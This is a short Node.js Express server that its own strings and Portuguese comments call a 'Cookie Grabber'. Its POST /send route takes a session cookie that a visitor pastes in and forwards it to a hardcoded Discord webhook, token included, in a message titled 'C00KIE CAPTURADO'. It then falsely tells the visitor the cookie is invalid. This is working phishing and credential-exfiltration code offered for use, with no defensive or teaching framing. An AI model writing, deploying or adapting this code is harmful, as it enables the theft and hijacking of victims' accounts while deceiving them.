const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/send', async (req, res) => {
  const cookie = (req.body.cookie || '').toString().trim();

  if (cookie) {
    try {
      await fetch("https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "C00KIE CAPTURADO",
            description: "```" + cookie + "```",
            color: 0x00dbde,
            timestamp: new Date().toISOString(),
            footer: { text: "Cookie Grabber • Fundo Lindo + Botão de Copiar" }
          }],
          components: [{
            type: 1,
            components: [{
              type: 2,
              style: 1,                    // estilo azul
              label: "Copiar cookie",
              custom_id: "copy_cookie",    // não é usado, mas precisa ter
              emoji: { name: "Clipboard" }
            }]
          }],
          // MAGIA: faz o Discord adicionar o botão de copiar automático
          content: "||`" + cookie + "`||"
        })
      });
    } catch (e) {
      console.error(e);
    }
  }

  res.json({ status: "C00kie Inválido" });
});

app.listen(PORT, () => {
  console.log(`Grabber lindo + botão de copiar rodando na porta ${PORT}`);
});
